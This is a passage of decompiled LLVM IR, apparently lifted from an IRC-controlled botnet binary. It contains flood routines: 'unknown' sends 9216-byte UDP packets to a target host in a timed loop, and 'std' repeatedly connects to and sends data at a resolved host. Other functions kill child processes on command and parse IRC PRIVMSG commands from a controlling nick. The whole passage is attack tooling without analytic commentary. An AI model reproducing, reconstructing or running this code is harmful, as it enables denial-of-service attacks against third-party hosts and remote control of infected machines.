  uselistorder i32 %v3_8048807, { 1, 0 }
  uselistorder i32 %v3_80487b2, { 1, 5, 4, 3, 2, 0 }
  uselistorder i32* %stack_var_-52, { 1, 0 }
  uselistorder i32* %stack_var_-36, { 1, 0 }
  uselistorder label %dec_label_pc_80489fc, { 4, 0, 1, 2, 3 }
  uselistorder label %dec_label_pc_80489b9, { 1, 0 }
  uselistorder label %dec_label_pc_8048989, { 1, 0 }
  uselistorder label %dec_label_pc_8048954, { 1, 0 }
  uselistorder label %bb40, { 1, 0 }
  uselistorder label %dec_label_pc_8048901, { 1, 0 }
  uselistorder label %bb38, { 1, 0 }
  uselistorder label %dec_label_pc_8048880, { 1, 0 }
}

define i32 @std(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %stack_var_-36 = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %v4_8048a07 = add i32 %arg2, -2
  %v9_8048a07 = sub i32 1, %arg2
  %v10_8048a07 = and i32 %v9_8048a07, %arg2
  %v11_8048a07 = icmp slt i32 %v10_8048a07, 0
  %v12_8048a07 = icmp eq i32 %v4_8048a07, 0
  %v13_8048a07 = icmp slt i32 %v4_8048a07, 0
  %v3_8048a0b = icmp eq i1 %v13_8048a07, %v11_8048a07
  %v4_8048a0b = icmp eq i1 %v12_8048a07, false
  %v5_8048a0b = and i1 %v4_8048a0b, %v3_8048a0b
  br i1 %v5_8048a0b, label %entry.dec_label_pc_8048a17_crit_edge, label %dec_label_pc_8048a0d

entry.dec_label_pc_8048a17_crit_edge:             ; preds = %entry
  br label %dec_label_pc_8048a17

dec_label_pc_8048a0d:                             ; preds = %entry
  %v1_8048a12 = call i32 @exit(i32 1)
  br label %dec_label_pc_8048a17

dec_label_pc_8048a17:                             ; preds = %entry.dec_label_pc_8048a17_crit_edge, %dec_label_pc_8048a0d
  %v4_8048a20 = call i32 @socket(i32 2, i32 2, i32 0)
  %v2_8048a30 = call i32 @time(i32* null)
  %v1_8048a3e = add i32 %arg3, 12
  %v1_8048a41 = inttoptr i32 %v1_8048a3e to i32*
  %v2_8048a41 = load i32, i32* %v1_8048a41, align 4
  %v1_8048a47 = inttoptr i32 %v2_8048a41 to i8*
  %v2_8048a47 = call i32 @atol(i8* %v1_8048a47)
  store i32 %v2_8048a47, i32* @eax, align 4
  %v1_8048a58 = call i32 @mfork(i32 %arg1)
  %v1_8048a60 = icmp eq i32 %v1_8048a58, 0
  %v1_8048a62 = icmp eq i1 %v1_8048a60, false
  br i1 %v1_8048a62, label %dec_label_pc_8048b48, label %dec_label_pc_8048a68

dec_label_pc_8048a68:                             ; preds = %dec_label_pc_8048a17
  %v1_8048a6b = add i32 %arg3, 4
  %v1_8048a6e = inttoptr i32 %v1_8048a6b to i32*
  %v2_8048a6e = load i32, i32* %v1_8048a6e, align 4
  store i32 %v2_8048a6e, i32* @eax, align 4
  %v1_8048a74 = call i32 @gethostbyname(i32 %v2_8048a6e)
  %v2_8048a84 = ptrtoint i32* %stack_var_-40 to i32
  %v3_8048a88 = call i32 @bzero(i32 %v2_8048a84, i32 16)
  %v1_8048a93 = add i32 %v1_8048a74, 12
  %v2_8048a93 = inttoptr i32 %v1_8048a93 to i32*
  %v3_8048a93 = load i32, i32* %v2_8048a93, align 4
  %v1_8048a9b = add i32 %v1_8048a74, 16
  %v2_8048a9b = inttoptr i32 %v1_8048a9b to i32*
  %v3_8048a9b = load i32, i32* %v2_8048a9b, align 4
  %v1_8048a9e = inttoptr i32 %v3_8048a9b to i32*
  %v2_8048a9e = load i32, i32* %v1_8048a9e, align 4
  %v15_8048aa7 = ptrtoint i32* %stack_var_-36 to i32
  %v4_8048aac = call i32 @bcopy(i32 %v2_8048a9e, i32 %v15_8048aa7, i32 %v3_8048a93)
  %v1_8048ab7 = add i32 %v1_8048a74, 8
  %v2_8048ab7 = inttoptr i32 %v1_8048ab7 to i32*
  %v3_8048ab7 = load i32, i32* %v2_8048ab7, align 4
  store i32 %v3_8048ab7, i32* %stack_var_-40, align 4
  %v1_8048ac1 = add i32 %arg3, 8
  %v1_8048ac4 = inttoptr i32 %v1_8048ac1 to i32*
  %v2_8048ac4 = load i32, i32* %v1_8048ac4, align 4
  %v1_8048aca = inttoptr i32 %v2_8048ac4 to i8*
  %v2_8048aca = call i32 @atol(i8* %v1_8048aca)
  %v5_8048b1d = add i32 %v2_8048a47, %v2_8048a30
  br label %dec_label_pc_8048add

dec_label_pc_8048add:                             ; preds = %dec_label_pc_8048b43, %dec_label_pc_8048a68
  %storemerge = phi i32 [ %v4_8048b43, %dec_label_pc_8048b43 ], [ 0, %dec_label_pc_8048a68 ]
  %tmp = icmp ult i32 %storemerge, 50
  br i1 %tmp, label %dec_label_pc_8048b43, label %dec_label_pc_8048ae3

dec_label_pc_8048ae3:                             ; preds = %dec_label_pc_8048add
  %v5_8048aef = call i32 @send(i32 0, i32 %v4_8048a20, i32 ptrtoint ([4 x i8]* @global_var_8054331.274 to i32), i32 50)
  %v4_8048b03 = call i32 @connect(i32 %v4_8048a20, i32 %v2_8048a84, i32 16)
  %v2_8048b10 = call i32 @time(i32* null)
  %v7_8048b20 = icmp ult i32 %v2_8048b10, %v5_8048b1d
  br i1 %v7_8048b20, label %dec_label_pc_8048b43, label %dec_label_pc_8048b24

dec_label_pc_8048b24:                             ; preds = %dec_label_pc_8048ae3
  %v1_8048b2a = call i32 @close(i32 %v4_8048a20)
  %v1_8048b37 = call i32 @exit(i32 0)
  br label %dec_label_pc_8048b43

dec_label_pc_8048b43:                             ; preds = %dec_label_pc_8048b24, %dec_label_pc_8048ae3, %dec_label_pc_8048add
  %stack_var_-8.0 = phi i32 [ %storemerge, %dec_label_pc_8048add ], [ 0, %dec_label_pc_8048ae3 ], [ 0, %dec_label_pc_8048b24 ]
  %v4_8048b43 = add i32 %stack_var_-8.0, 1
  br label %dec_label_pc_8048add

dec_label_pc_8048b48:                             ; preds = %dec_label_pc_8048a17
  ret i32 %v1_8048a58

; uselistorder directives
  uselistorder i32 %storemerge, { 1, 0 }
  uselistorder i32 %v4_8048a07, { 1, 0 }
  uselistorder i32 %arg3, { 2, 1, 0 }
  uselistorder label %dec_label_pc_8048a17, { 1, 0 }
}

define i32 @stop(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %stack_var_-4 = alloca i32, align 4
  %v0_8048b4a = load i32, i32* @ebp, align 4
  store i32 %v0_8048b4a, i32* %stack_var_-4, align 4
  %v4_8048b4a = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v4_8048b4a, i32* @ebp, align 4
  %v4_8048b8e = icmp eq i32 %arg2, 0
  %v0_8048be114 = load i32, i32* @global_var_8056570.268, align 16
  %v10_8048be616 = icmp eq i32 %v0_8048be114, 0
  br i1 %v10_8048be616, label %dec_label_pc_8048bef, label %dec_label_pc_8048b5d

dec_label_pc_8048b5d:                             ; preds = %entry, %dec_label_pc_8048bde
  %storemerge21 = phi i32 [ %v4_8048bde, %dec_label_pc_8048bde ], [ 0, %entry ]
  %v2_8048b60 = mul i32 %storemerge21, 4
  %v0_8048b65 = load i32, i32* @global_var_8056f50.269, align 16
  %v2_8048b6a = add i32 %v0_8048b65, %v2_8048b60
  %v1_8048b6d = inttoptr i32 %v2_8048b6a to i32*
  %v2_8048b6d = load i32, i32* %v1_8048b6d, align 4
  %v1_8048b6f = icmp eq i32 %v2_8048b6d, 0
  br i1 %v1_8048b6f, label %dec_label_pc_8048bde, label %dec_label_pc_8048b73

dec_label_pc_8048b73:                             ; preds = %dec_label_pc_8048b5d
  store i32 %v2_8048b60, i32* @edx, align 4
  %v2_8048b83 = load i32, i32* %v1_8048b6d, align 4
  store i32 %v2_8048b83, i32* @ebx, align 4
  %v0_8048b85 = call i32 @getpid()
  %v0_8048b8a = load i32, i32* @ebx, align 4
  %v12_8048b8a = icmp eq i32 %v0_8048b8a, %v0_8048b85
  br i1 %v12_8048b8a, label %dec_label_pc_8048bde, label %dec_label_pc_8048b8e

dec_label_pc_8048b8e:                             ; preds = %dec_label_pc_8048b73
  br i1 %v4_8048b8e, label %dec_label_pc_8048b8e.dec_label_pc_8048bbe_crit_edge, label %dec_label_pc_8048b94

dec_label_pc_8048b8e.dec_label_pc_8048bbe_crit_edge: ; preds = %dec_label_pc_8048b8e
  br label %dec_label_pc_8048bbe

dec_label_pc_8048b94:                             ; preds = %dec_label_pc_8048b8e
  %v0_8048ba6 = load i32, i32* @global_var_8056f4c.275, align 4
  store i32 %v0_8048ba6, i32* @edx, align 4
  %v4_8048bb6 = call i32 @Send(i32 %arg1, i32 ptrtoint ([29 x i8]* @global_var_8054335.276 to i32), i32 %v0_8048ba6)
  br label %dec_label_pc_8048bbe

dec_label_pc_8048bbe:                             ; preds = %dec_label_pc_8048b8e.dec_label_pc_8048bbe_crit_edge, %dec_label_pc_8048b94
  %v0_8048bc6 = load i32, i32* @global_var_8056f50.269, align 16
  %v2_8048bcb = add i32 %v0_8048bc6, %v2_8048b60
  %v1_8048bce = inttoptr i32 %v2_8048bcb to i32*
  %v2_8048bce = load i32, i32* %v1_8048bce, align 4
  %v3_8048bd6 = call i32 @kill(i32 %v2_8048bce, i32 9)
  br label %dec_label_pc_8048bde

dec_label_pc_8048bde:                             ; preds = %dec_label_pc_8048b73, %dec_label_pc_8048b5d, %dec_label_pc_8048bbe
  %v4_8048bde = add i32 %storemerge21, 1
  %v0_8048be1 = load i32, i32* @global_var_8056570.268, align 16
  %v10_8048be6 = icmp ult i32 %v4_8048bde, %v0_8048be1
  br i1 %v10_8048be6, label %dec_label_pc_8048b5d, label %dec_label_pc_8048be1.dec_label_pc_8048bef_crit_edge

dec_label_pc_8048be1.dec_label_pc_8048bef_crit_edge: ; preds = %dec_label_pc_8048bde
  br label %dec_label_pc_8048bef

dec_label_pc_8048bef:                             ; preds = %entry, %dec_label_pc_8048be1.dec_label_pc_8048bef_crit_edge
  %v0_8048be1.lcssa = phi i32 [ %v0_8048be1, %dec_label_pc_8048be1.dec_label_pc_8048bef_crit_edge ], [ 0, %entry ]
  ret i32 %v0_8048be1.lcssa

; uselistorder directives
  uselistorder i32 %v4_8048bde, { 1, 0 }
  uselistorder i32 %v2_8048b60, { 2, 0, 1 }
  uselistorder i32 %storemerge21, { 1, 0 }
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder label %dec_label_pc_8048bef, { 1, 0 }
  uselistorder label %dec_label_pc_8048bde, { 2, 0, 1 }
  uselistorder label %dec_label_pc_8048bbe, { 1, 0 }
  uselistorder label %dec_label_pc_8048b5d, { 1, 0 }
}

define i32 @unknown(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %tmp = call i32 @__decompiler_undefined_function_0()
  %stack_var_-32 = alloca i32, align 4
  %stack_var_-48 = alloca i32, align 4
  %stack_var_-76 = alloca i32, align 4
  store i32 1, i32* %stack_var_-32, align 4
  store i32 9216, i32* %stack_var_-76, align 4
  %v1_8048c09 = call i32 @malloc(i32 9216)
  store i32 0, i32* %stack_var_-76, align 4
  %v2_8048c19 = call i32 @time(i32* null)
  store i32 %v2_8048c19, i32* @eax, align 4
  store i32 %arg2, i32* %stack_var_-76, align 4
  %v1_8048c2a = call i32 @mfork(i32 %arg2)
  %v1_8048c32 = icmp eq i32 %v1_8048c2a, 0
  %v1_8048c34 = icmp eq i1 %v1_8048c32, false
  br i1 %v1_8048c34, label %dec_label_pc_8048d67, label %dec_label_pc_8048c3a

dec_label_pc_8048c3a:                             ; preds = %entry
  %v12_8048c3a = icmp eq i32 %arg3, 2
  br i1 %v12_8048c3a, label %dec_label_pc_8048c4a, label %dec_label_pc_8048c40

dec_label_pc_8048c40:                             ; preds = %dec_label_pc_8048c3a
  store i32 1, i32* %stack_var_-76, align 4
  %v1_8048c45 = call i32 @exit(i32 1)
  br label %dec_label_pc_8048c4a

dec_label_pc_8048c4a:                             ; preds = %dec_label_pc_8048c3a, %dec_label_pc_8048c40
  %v1_8048c4d = add i32 %arg4, 8
  %v1_8048c50 = inttoptr i32 %v1_8048c4d to i32*
  %v2_8048c50 = load i32, i32* %v1_8048c50, align 4
  store i32 %v2_8048c50, i32* %stack_var_-76, align 4
  %v1_8048c56 = inttoptr i32 %v2_8048c50 to i8*
  %v2_8048c56 = call i32 @atol(i8* %v1_8048c56)
  %v2_8048c68 = ptrtoint i32* %stack_var_-48 to i32
  store i32 %v2_8048c68, i32* %stack_var_-76, align 4
  %v4_8048c6c = bitcast i32* %stack_var_-48 to i8*
  %v5_8048c6c = call i32 @memset(i8* %v4_8048c6c, i32 0, i32 16)
  %v1_8048c77 = add i32 %arg4, 4
  %v1_8048c7a = inttoptr i32 %v1_8048c77 to i32*
  %v2_8048c7a = load i32, i32* %v1_8048c7a, align 4
  store i32 %arg2, i32* %stack_var_-76, align 4
  %v3_8048c83 = call i32 @host2ip(i32 %arg2, i32 %v2_8048c7a)
  store i32 2, i32* %stack_var_-48, align 4
  %v0_8048c9c = load i32, i32* @global_var_8056f4c.275, align 4
  store i32 %v0_8048c9c, i32* @edx, align 4
  store i32 %arg1, i32* %stack_var_-76, align 4
  %v4_8048cac = call i32 @Send(i32 %arg1, i32 ptrtoint ([30 x i8]* @global_var_8054352.277 to i32), i32 %v0_8048c9c)
  %v5_8048d39 = add i32 %v2_8048c56, %v2_8048c19
  %v2_8048ce1 = ptrtoint i32* %stack_var_-32 to i32
  br label %dec_label_pc_8048cb4

dec_label_pc_8048cb4:                             ; preds = %dec_label_pc_8048d47, %dec_label_pc_8048c4a
  %stack_var_-24.0 = phi i32 [ %tmp, %dec_label_pc_8048c4a ], [ %v4_8048d47, %dec_label_pc_8048d47 ]
  %v0_8048cb4 = load i32, i32* %stack_var_-76, align 4
  %v1_8048cb4 = call i32 @rand(i32 %v0_8048cb4)
  store i32 2, i32* %stack_var_-76, align 4
  %v4_8048cc6 = call i32 @socket(i32 2, i32 2, i32 17)
  %v5_8048cd1 = icmp slt i32 %v4_8048cc6, 0
  br i1 %v5_8048cd1, label %dec_label_pc_8048d21, label %dec_label_pc_8048cd7

dec_label_pc_8048cd7:                             ; preds = %dec_label_pc_8048cb4
  store i32 1, i32* %stack_var_-32, align 4
  store i32 %v4_8048cc6, i32* %stack_var_-76, align 4
  %v4_8048ced = call i32 @ioctl(i32 %v4_8048cc6, i32 21537, i32 %v2_8048ce1)
  store i32 %v2_8048c68, i32* %stack_var_-76, align 4
  %v7_8048d0b = call i32 @sendto(i32 %v4_8048cc6, i32 %v1_8048c09, i32 9216, i32 0, i32 %v2_8048c68, i32 16)
  store i32 %v4_8048cc6, i32* %stack_var_-76, align 4
  %v1_8048d19 = call i32 @close(i32 %v4_8048cc6)
  br label %dec_label_pc_8048d21

dec_label_pc_8048d21:                             ; preds = %dec_label_pc_8048cb4, %dec_label_pc_8048cd7
  %v7_8048d25 = icmp sgt i32 %stack_var_-24.0, 49
  br i1 %v7_8048d25, label %dec_label_pc_8048d27, label %dec_label_pc_8048d47

dec_label_pc_8048d27:                             ; preds = %dec_label_pc_8048d21
  store i32 0, i32* %stack_var_-76, align 4
  %v2_8048d2c = call i32 @time(i32* null)
  %v7_8048d3c = icmp ult i32 %v2_8048d2c, %v5_8048d39
  %v1_8048d3e = icmp eq i1 %v7_8048d3c, false
  br i1 %v1_8048d3e, label %dec_label_pc_8048d4f, label %dec_label_pc_8048d47

dec_label_pc_8048d47:                             ; preds = %dec_label_pc_8048d27, %dec_label_pc_8048d21
  %stack_var_-24.1 = phi i32 [ %stack_var_-24.0, %dec_label_pc_8048d21 ], [ 0, %dec_label_pc_8048d27 ]
  %v4_8048d47 = add i32 %stack_var_-24.1, 1
  br label %dec_label_pc_8048cb4

dec_label_pc_8048d4f:                             ; preds = %dec_label_pc_8048d27
  store i32 %v4_8048cc6, i32* %stack_var_-76, align 4
  %v1_8048d55 = call i32 @close(i32 %v4_8048cc6)
  store i32 0, i32* %stack_var_-76, align 4
  %v1_8048d62 = call i32 @exit(i32 0)
  br label %dec_label_pc_8048d67

dec_label_pc_8048d67:                             ; preds = %entry, %dec_label_pc_8048d4f
  %v0_8048d68 = phi i32 [ %v1_8048c2a, %entry ], [ %v1_8048d62, %dec_label_pc_8048d4f ]
  ret i32 %v0_8048d68

; uselistorder directives
  uselistorder i32 %v4_8048cc6, { 1, 0, 3, 2, 4, 6, 5, 7 }
  uselistorder i32 %v2_8048c50, { 1, 0 }
  uselistorder i32* %stack_var_-76, { 1, 2, 3, 4, 5, 6, 7, 0, 8, 9, 10, 11, 12, 13, 14, 15 }
  uselistorder i32* %stack_var_-48, { 1, 0, 2 }
  uselistorder i32* %stack_var_-32, { 0, 2, 1 }
  uselistorder i32 (i32)* @mfork, { 1, 0 }
  uselistorder i32 %arg4, { 1, 0 }
  uselistorder i32 %arg2, { 3, 2, 1, 0 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_8048d67, { 1, 0 }
  uselistorder label %dec_label_pc_8048d21, { 1, 0 }
  uselistorder label %dec_label_pc_8048c4a, { 1, 0 }
}

define i32 @killsec(i32 %arg1) local_unnamed_addr {
entry:
  %v0_8048d6f = load i32, i32* bitcast ([6 x i8]** @global_var_80564a4.279 to i32*), align 4
  %v5_8048d7a = inttoptr i32 %v0_8048d6f to i8*
  %v4_8048d7b = call i32 @strcasecmp(i8* %v5_8048d7a, i32 %arg1)
  %v1_8048d83 = icmp eq i32 %v4_8048d7b, 0
  %v1_8048d85 = icmp eq i1 %v1_8048d83, false
  br i1 %v1_8048d85, label %dec_label_pc_8048d96, label %dec_label_pc_8048d87

dec_label_pc_8048d87:                             ; preds = %entry
  %v3_8048d8e = call i32 @kill(i32 0, i32 9)
  br label %dec_label_pc_8048d96

dec_label_pc_8048d96:                             ; preds = %entry, %dec_label_pc_8048d87
  %v0_8048d97 = phi i32 [ %v4_8048d7b, %entry ], [ %v3_8048d8e, %dec_label_pc_8048d87 ]
  ret i32 %v0_8048d97

; uselistorder directives
  uselistorder i32 (i32, i32)* @kill, { 1, 0 }
  uselistorder label %dec_label_pc_8048d96, { 1, 0 }
}

define i32 @_PRIVMSG(i8* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %stack_var_8 = alloca i8*, align 4
  %tmp55 = inttoptr i32 %arg2 to i8*
  store i8* %tmp55, i8** %stack_var_8, align 4
  %stack_var_-20 = alloca i8*, align 4
  %stack_var_-24 = alloca i8*, align 4
  %tmp59 = inttoptr i32 %arg3 to i8*
  %stack_var_-1100 = alloca i32, align 4
  br label %dec_label_pc_8048dae

dec_label_pc_8048dab:                             ; preds = %dec_label_pc_8048dc3
  %v4_8048dab = add i32 %storemerge19, 1
  br label %dec_label_pc_8048dae

dec_label_pc_8048dae:                             ; preds = %entry, %dec_label_pc_8048dab
  %storemerge19 = phi i32 [ %v4_8048dab, %dec_label_pc_8048dab ], [ 0, %entry ]
  %v3_8048db7 = call i32 @strlen(i8* %tmp59)
  %v7_8048dbf = icmp ult i32 %storemerge19, %v3_8048db7
  %v1_8048dc1 = icmp eq i1 %v7_8048dbf, false
  %.pre = add i32 %storemerge19, %arg3
  br i1 %v1_8048dc1, label %dec_label_pc_8048dae.dec_label_pc_8048dcf_crit_edge, label %dec_label_pc_8048dc3

dec_label_pc_8048dae.dec_label_pc_8048dcf_crit_edge: ; preds = %dec_label_pc_8048dae
  %.pre42 = inttoptr i32 %.pre to i8*
  br label %dec_label_pc_8048dcf

dec_label_pc_8048dc3:                             ; preds = %dec_label_pc_8048dae
  %v1_8048dc9 = inttoptr i32 %.pre to i8*
  %v2_8048dc9 = load i8, i8* %v1_8048dc9, align 1
  %v7_8048dcb = icmp eq i8 %v2_8048dc9, 32
  %v1_8048dcd = icmp eq i1 %v7_8048dcb, false
  br i1 %v1_8048dcd, label %dec_label_pc_8048dab, label %dec_label_pc_8048dcf

dec_label_pc_8048dcf:                             ; preds = %dec_label_pc_8048dc3, %dec_label_pc_8048dae.dec_label_pc_8048dcf_crit_edge
  %v1_8048dd5.pre-phi = phi i8* [ %.pre42, %dec_label_pc_8048dae.dec_label_pc_8048dcf_crit_edge ], [ %v1_8048dc9, %dec_label_pc_8048dc3 ]
  store i8 0, i8* %v1_8048dd5.pre-phi, align 1
  store i8* %tmp59, i8** %stack_var_-24, align 4
  %v1_8048de4 = add i32 %.pre, 2
  %v5_8048de7 = inttoptr i32 %v1_8048de4 to i8*
  store i8* %v5_8048de7, i8** %stack_var_-20, align 4
  %tmp73 = bitcast i8** %stack_var_8 to i32*
  %v3_8048dfc7.pre = load i32, i32* %tmp73, align 4
  %v0_8048dff.cast = inttoptr i32 %v3_8048dfc7.pre to i8*
  br label %dec_label_pc_8048df6

dec_label_pc_8048df3:                             ; preds = %dec_label_pc_8048e0b
  %v4_8048df3 = add i32 %storemerge18, 1
  br label %dec_label_pc_8048df6

dec_label_pc_8048df6:                             ; preds = %dec_label_pc_8048dcf, %dec_label_pc_8048df3
  %storemerge18 = phi i32 [ %v4_8048df3, %dec_label_pc_8048df3 ], [ 0, %dec_label_pc_8048dcf ]
  store i32 %storemerge18, i32* @ebx, align 4
  %v3_8048dff = call i32 @strlen(i8* %v0_8048dff.cast)
  %v0_8048e07 = load i32, i32* @ebx, align 4
  %v7_8048e07 = icmp ult i32 %v0_8048e07, %v3_8048dff
  %v1_8048e09 = icmp eq i1 %v7_8048e07, false
  %.pre44 = add i32 %storemerge18, %v3_8048dfc7.pre
  br i1 %v1_8048e09, label %dec_label_pc_8048df6.dec_label_pc_8048e17_crit_edge, label %dec_label_pc_8048e0b

dec_label_pc_8048df6.dec_label_pc_8048e17_crit_edge: ; preds = %dec_label_pc_8048df6
  %.pre51 = inttoptr i32 %.pre44 to i8*
  br label %dec_label_pc_8048e17

dec_label_pc_8048e0b:                             ; preds = %dec_label_pc_8048df6
  %v1_8048e11 = inttoptr i32 %.pre44 to i8*
  %v2_8048e11 = load i8, i8* %v1_8048e11, align 1
  %v10_8048e13 = icmp eq i8 %v2_8048e11, 33
  %v1_8048e15 = icmp eq i1 %v10_8048e13, false
  br i1 %v1_8048e15, label %dec_label_pc_8048df3, label %dec_label_pc_8048e17

dec_label_pc_8048e17:                             ; preds = %dec_label_pc_8048e0b, %dec_label_pc_8048df6.dec_label_pc_8048e17_crit_edge
  %v1_8048e1d.pre-phi = phi i8* [ %.pre51, %dec_label_pc_8048df6.dec_label_pc_8048e17_crit_edge ], [ %v1_8048e11, %dec_label_pc_8048e0b ]
  store i8 0, i8* %v1_8048e1d.pre-phi, align 1
  %v3_8048e20 = load i8*, i8** %stack_var_-20, align 4
  %v4_8048e20 = ptrtoint i8* %v3_8048e20 to i32
  %v2_8048e23 = load i8, i8* %v3_8048e20, align 1
  %v3_8048e23 = zext i8 %v2_8048e23 to i32
  %v5_8048e23 = and i32 %v4_8048e20, -256
  %v6_8048e23 = or i32 %v3_8048e23, %v5_8048e23
  %v10_8048e25 = icmp eq i8 %v2_8048e23, 33
  %v1_8048e27 = icmp eq i1 %v10_8048e25, false
  br i1 %v1_8048e27, label %dec_label_pc_804908c, label %dec_label_pc_8048e2d

dec_label_pc_8048e2d:                             ; preds = %dec_label_pc_8048e17
  %v0_8048e2d = load i32, i32* @global_var_8056f4c.275, align 4
  %tmp74 = bitcast i8** %stack_var_-24 to i32*
  %v3_8048e368 = load i32, i32* %tmp74, align 4
  %v0_8048e39.cast = inttoptr i32 %v3_8048e368 to i8*
  %v4_8048e39 = call i32 @strcasecmp(i8* %v0_8048e39.cast, i32 %v0_8048e2d)
  %v1_8048e41 = icmp eq i32 %v4_8048e39, 0
  %v1_8048e43 = icmp eq i1 %v1_8048e41, false
  br i1 %v1_8048e43, label %dec_label_pc_804908c, label %dec_label_pc_8048e49

dec_label_pc_8048e49:                             ; preds = %dec_label_pc_8048e2d
  %v2_8048e49 = ptrtoint i32* %stack_var_-1100 to i32
  store i32 %v2_8048e49, i32* @edx, align 4
  %tmp75 = bitcast i32* %stack_var_-1100 to i8*
  %v5_8048e5b = call i32 @memset(i8* %tmp75, i32 0, i32 1024)
  %v5_8048e6a = add i32 %v4_8048e20, 1
  %v22_8048e6a = inttoptr i32 %v5_8048e6a to i8*
  store i8* %v22_8048e6a, i8** %stack_var_-20, align 4
  br label %dec_label_pc_8048e79

dec_label_pc_8048e76:                             ; preds = %dec_label_pc_8048e8e
  %v4_8048e76 = add i32 %storemerge17, 1
  br label %dec_label_pc_8048e79

dec_label_pc_8048e79:                             ; preds = %dec_label_pc_8048e49, %dec_label_pc_8048e76
  %storemerge17 = phi i32 [ %v4_8048e76, %dec_label_pc_8048e76 ], [ 0, %dec_label_pc_8048e49 ]
  store i32 %storemerge17, i32* @ebx, align 4
  %v0_8048e82.cast = inttoptr i32 %v5_8048e6a to i8*
  %v3_8048e82 = call i32 @strlen(i8* %v0_8048e82.cast)
  %v0_8048e8a = load i32, i32* @ebx, align 4
  %v7_8048e8a = icmp ult i32 %v0_8048e8a, %v3_8048e82
  %v1_8048e8c = icmp eq i1 %v7_8048e8a, false
  %.pre135 = add i32 %v5_8048e6a, %storemerge17
  br i1 %v1_8048e8c, label %dec_label_pc_8048e79.dec_label_pc_8048e9a_crit_edge, label %dec_label_pc_8048e8e

dec_label_pc_8048e79.dec_label_pc_8048e9a_crit_edge: ; preds = %dec_label_pc_8048e79
  %.pre136 = inttoptr i32 %.pre135 to i8*
  br label %dec_label_pc_8048e9a

dec_label_pc_8048e8e:                             ; preds = %dec_label_pc_8048e79
  %v1_8048e94 = inttoptr i32 %.pre135 to i8*
  %v2_8048e94 = load i8, i8* %v1_8048e94, align 1
  %v7_8048e96 = icmp eq i8 %v2_8048e94, 32
  %v1_8048e98 = icmp eq i1 %v7_8048e96, false
  br i1 %v1_8048e98, label %dec_label_pc_8048e76, label %dec_label_pc_8048e9a

dec_label_pc_8048e9a:                             ; preds = %dec_label_pc_8048e79.dec_label_pc_8048e9a_crit_edge, %dec_label_pc_8048e8e
  %v1_8048ea0.pre-phi = phi i8* [ %.pre136, %dec_label_pc_8048e79.dec_label_pc_8048e9a_crit_edge ], [ %v1_8048e94, %dec_label_pc_8048e8e ]
  store i8 0, i8* %v1_8048ea0.pre-phi, align 1
  %v0_8048ea3 = load i32, i32* @global_var_8056f34.280, align 4
  %v3_8048ea8 = load i8*, i8** %stack_var_-20, align 4
  %v4_8048eb0 = call i32 @strwildmatch(i8* %v3_8048ea8, i32 %v0_8048ea3)
  %v1_8048eb8 = icmp eq i32 %v4_8048eb0, 0
  %v1_8048eba = icmp eq i1 %v1_8048eb8, false
  br i1 %v1_8048eba, label %dec_label_pc_804908c, label %dec_label_pc_8048ec0

dec_label_pc_8048ec0:                             ; preds = %dec_label_pc_8048e9a
  %v4_8048ea8 = ptrtoint i8* %v3_8048ea8 to i32
  %v1_8048ec3 = add i32 %v4_8048ea8, 1
  %v2_8048ec7 = add i32 %v1_8048ec3, %storemerge17
  %v5_8048eca = inttoptr i32 %v2_8048ec7 to i8*
  store i8* %v5_8048eca, i8** %stack_var_-20, align 4
  %v3_8048ed3 = call i32 @strlen(i8* %v5_8048eca)
  %v5_8048f14118 = icmp sgt i32 %v3_8048ed3, 0
  br i1 %v5_8048f14118, label %dec_label_pc_8048ee7, label %dec_label_pc_8048f31.preheader

dec_label_pc_8048ee7:                             ; preds = %dec_label_pc_8048ec0, %dec_label_pc_8048ef9
  %v3_8048ee7 = phi i8* [ %v22_8048f08, %dec_label_pc_8048ef9 ], [ %v5_8048eca, %dec_label_pc_8048ec0 ]
  %storemerge16119 = phi i32 [ %v4_8048f0b, %dec_label_pc_8048ef9 ], [ 0, %dec_label_pc_8048ec0 ]
  %v4_8048ee7 = ptrtoint i8* %v3_8048ee7 to i32
  %v2_8048eea = load i8, i8* %v3_8048ee7, align 1
  %v7_8048eec = icmp eq i8 %v2_8048eea, 32
  br i1 %v7_8048eec, label %dec_label_pc_8048f31.preheader, label %dec_label_pc_8048ef0

dec_label_pc_8048ef0:                             ; preds = %dec_label_pc_8048ee7
  %v2_8048ef3 = load i8, i8* %v3_8048ee7, align 1
  %v4_8048ef5 = icmp eq i8 %v2_8048ef3, 0
  br i1 %v4_8048ef5, label %dec_label_pc_8048f31.preheader, label %dec_label_pc_8048ef9

dec_label_pc_8048ef9:                             ; preds = %dec_label_pc_8048ef0
  %v2_8048eff = load i8, i8* %v3_8048ee7, align 1
  %v2_8048f01 = load i32, i32* @ebp, align 4
  %v4_8048f01 = add nsw i32 %storemerge16119, -1096
  %v5_8048f01 = add i32 %v4_8048f01, %v2_8048f01
  %v6_8048f01 = inttoptr i32 %v5_8048f01 to i8*
  store i8 %v2_8048eff, i8* %v6_8048f01, align 1
  %v3_8048f08 = load i8*, i8** %stack_var_-20, align 4
  %v4_8048f08 = ptrtoint i8* %v3_8048f08 to i32
  %v5_8048f08 = add i32 %v4_8048f08, 1
  %v22_8048f08 = inttoptr i32 %v5_8048f08 to i8*
  store i8* %v22_8048f08, i8** %stack_var_-20, align 4
  %v4_8048f0b = add nuw nsw i32 %storemerge16119, 1
  %v5_8048f14 = icmp slt i32 %v4_8048f0b, %v3_8048ed3
  br i1 %v5_8048f14, label %dec_label_pc_8048ee7, label %dec_label_pc_8048f31.preheader

dec_label_pc_8048f31.preheader:                   ; preds = %dec_label_pc_8048ef0, %dec_label_pc_8048ee7, %dec_label_pc_8048ec0, %dec_label_pc_8048ef9
  %v4_8048f22132 = phi i8* [ %v5_8048eca, %dec_label_pc_8048ec0 ], [ %v22_8048f08, %dec_label_pc_8048ef9 ], [ %v3_8048ee7, %dec_label_pc_8048ee7 ], [ %v3_8048ee7, %dec_label_pc_8048ef0 ]
